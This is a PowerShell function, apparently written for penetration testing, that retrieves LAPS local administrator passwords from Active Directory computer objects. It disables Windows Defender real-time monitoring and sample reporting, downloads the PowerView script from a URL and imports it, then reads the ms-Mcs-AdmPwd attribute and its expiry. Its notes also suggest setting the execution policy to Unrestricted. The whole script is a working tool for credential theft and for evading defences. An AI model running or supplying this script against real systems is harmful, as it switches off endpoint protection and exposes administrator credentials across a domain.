function Get-LapsLocalAdminPassword {
    <#
    .SYNOPSIS
        This script reads ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attributes if user have all
        extended rights on computer account.
    .PARAMETER pUrl
        The parameter pUrl is used to define the URL of PowerView script.
    .PARAMETER disableDefender
        The parameter disableDefender is used to disable Windows Defender.
    .EXAMPLE
        PS C:\> Get-LocalAdminPassword -disableDefender
    .NOTES
        Windows Powershell should be run as domain user rights with local admin privileges.
        If you have Internet connection during penetration test,powerview url is following.
        https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
        If running scripts is disabled on your system, execute following command firstly:
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
    #>
    param (
        [string]$pUrl = $(Read-Host -Prompt '[*] Url of Powerview.ps1 script '),
        [switch]$disableDefender
    )
    begin {
        Write-Host " Obtaining ms-mcs-admpwd attribute value via MS-DS-Machine-Account-Quota" -ForegroundColor Green
    }
    process {
        $dPath = $env:USERPROFILE
        Write-Host "UserProfile: $dPath" -ForegroundColor Yellow
        $hName = $env:COMPUTERNAME
        Write-Host "Computername: $hName" -ForegroundColor Yellow
        Write-Host "[*] Windows Defender will be disabled for running PowerView.ps1 $disableDefender"
    if ($disableDefender) {
        Set-MpPreference -DisableRealtimeMonitoring $true -SubmitSamplesConsent NeverSend -MAPSReporting Disable -ErrorAction Stop
        Invoke-WebRequest $pUrl -OutFile $dPath\Desktop\PowerView.ps1 -TimeoutSec 30
        Import-Module -Name $dPath\Desktop\PowerView.ps1
        $admPwd = Get-DomainComputer -Identity $hName | Select-Object -Property ms-mcs-*
        Write-Host "$admPwd" -ForegroundColor Green
        $eTime = Read-Host -Prompt '[*] String admpwd expirationtime'
        $expTime = cmd.exe /c "w32tm /ntte $eTime"
        Write-Host "$expTime" -ForegroundColor Green
    } else {
        Write-Host "[-] Cancelled!" -ForegroundColor Red
    }
    }
}
